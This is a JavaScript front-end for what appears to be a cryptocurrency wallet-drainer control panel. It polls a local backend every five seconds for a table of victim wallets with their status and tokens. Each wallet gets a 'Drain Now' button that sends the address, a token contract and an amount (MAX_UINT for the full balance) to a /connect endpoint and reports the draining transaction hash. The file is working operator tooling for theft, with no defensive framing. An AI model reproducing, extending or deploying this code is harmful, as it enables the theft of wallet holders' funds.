const backendUrl = "http://localhost:5000";

async function fetchWallets() {
  const res = await fetch(`${backendUrl}/wallets`);
  const data = await res.json();
  const tableBody = document.querySelector("#walletTable tbody");

  tableBody.innerHTML = "";

  data.wallets.forEach(wallet => {
    const row = document.createElement("tr");

    row.innerHTML = `
      <td>${wallet.address}</td>
      <td>${wallet.status}</td>
      <td>${wallet.tokens || "N/A"}</td>
      <td>
        <button onclick="drainWallet('${wallet.address}')">Drain Now</button>
      </td>
    `;

    tableBody.appendChild(row);
  });
}

async function drainWallet(walletAddress) {
  const token = prompt("Enter token contract address:");
  const amount = prompt("Enter amount to drain (use MAX_UINT for full):");

  const res = await fetch(`${backendUrl}/connect`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      wallet: walletAddress,
      token,
      amount
    })
  });

  const result = await res.json();
  alert("Draining TX Hash: " + result.tx_hash);
  fetchWallets(); // refresh table
}

setInterval(fetchWallets, 5000); // auto-refresh every 5 sec
